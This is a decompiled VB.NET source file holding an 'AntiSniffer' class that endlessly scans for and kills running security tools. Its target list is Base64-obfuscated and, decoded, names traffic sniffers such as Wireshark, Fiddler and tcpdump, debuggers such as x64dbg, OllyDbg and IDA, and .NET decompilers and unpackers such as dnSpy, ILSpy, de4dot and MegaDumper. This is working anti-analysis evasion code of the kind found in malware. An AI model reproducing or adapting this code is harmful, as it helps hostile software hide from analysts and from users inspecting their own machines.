﻿Imports System
Imports System.Collections.Generic
Imports System.Threading

Namespace Complex
	' Token: 0x0200001C RID: 28
	Public Class AntiSniffer
		' Token: 0x060000BB RID: 187 RVA: 0x0000AD90 File Offset: 0x00008F90
		Public Shared Sub SniffersKiller()
			While True
				Try
					For i As Integer = 0 To AntiSniffer.AppFilter.Count - 1
						Dim index As Integer = i
						For j As Integer = 0 To AntiSniffer.DumpFilter.Count - 1
							Dim index2 As Integer = j
							ProcessKiller.ClosingCycle(AntiSniffer.AppFilter(index), AntiSniffer.DumpFilter(index2))
						Next
					Next
					Thread.Sleep(100)
				Catch
				End Try
			End While
		End Sub

		' Token: 0x0400009B RID: 155
		Private Shared AppFilter As List(Of String) = New List(Of String)() From { Program.Base64Decode("aHR0cCBhbmFseXplciBzdGFuZC1hbG9uZQ=="), Program.Base64Decode("ZmlkZGxlcg=="), Program.Base64Decode("ZWZmZXRlY2ggaHR0cCBzbmlmZmVy"), Program.Base64Decode("ZmlyZXNoZWVw"), Program.Base64Decode("SUVXYXRjaCBQcm9mZXNzaW9uYWw="), Program.Base64Decode("ZHVtcGNhcA=="), Program.Base64Decode("d2lyZXNoYXJr"), Program.Base64Decode("d2lyZXNoYXJrIHBvcnRhYmxl"), Program.Base64Decode("c3lzaW50ZXJuYWxzIHRjcHZpZXc="), Program.Base64Decode("TmV0d29ya01pbmVy"), Program.Base64Decode("TmV0d29ya1RyYWZmaWNWaWV3"), Program.Base64Decode("SFRUUE5ldHdvcmtTbmlmZmVy"), Program.Base64Decode("dGNwZHVtcA=="), Program.Base64Decode("aW50ZXJjZXB0ZXI="), Program.Base64Decode("SW50ZXJjZXB0ZXItTkc="), Program.Base64Decode("b2xseWRiZw=="), Program.Base64Decode("eDY0ZGJn"), Program.Base64Decode("eDMyZGJn"), Program.Base64Decode("ZG5zcHk="), Program.Base64Decode("ZG5zcHkteDg2"), Program.Base64Decode("ZGU0ZG90"), Program.Base64Decode("aWxzcHk="), Program.Base64Decode("ZG90cGVlaw=="), Program.Base64Decode("ZG90cGVlazY0"), Program.Base64Decode("aWRhNjQ="), Program.Base64Decode("cHJvY2V4cA=="), Program.Base64Decode("cHJvY2V4cDY0"), Program.Base64Decode("UkRHIFBhY2tlciBEZXRlY3Rvcg=="), Program.Base64Decode("Q0ZGIEV4cGxvcmVy"), Program.Base64Decode("UEVpRA=="), Program.Base64Decode("cHJvdGVjdGlvbl9pZA=="), Program.Base64Decode("TG9yZFBF"), Program.Base64Decode("cGUtc2lldmU="), Program.Base64Decode("TWVnYUR1bXBlcg=="), Program.Base64Decode("VW5Db25mdXNlckV4"), Program.Base64Decode("VW5pdmVyc2FsX0ZpeGVy"), Program.Base64Decode("Tm9GdXNlckV4") }

		' Token: 0x0400009C RID: 156
		Private Shared DumpFilter As List(Of String) = New List(Of String)() From { Program.Base64Decode("TmV0d29ya01pbmVy"), Program.Base64Decode("TmV0d29ya1RyYWZmaWNWaWV3"), Program.Base64Decode("SFRUUE5ldHdvcmtTbmlmZmVy"), Program.Base64Decode("dGNwZHVtcA=="), Program.Base64Decode("aW50ZXJjZXB0ZXI="), Program.Base64Decode("SW50ZXJjZXB0ZXItTkc=") }
	End Class
End Namespace
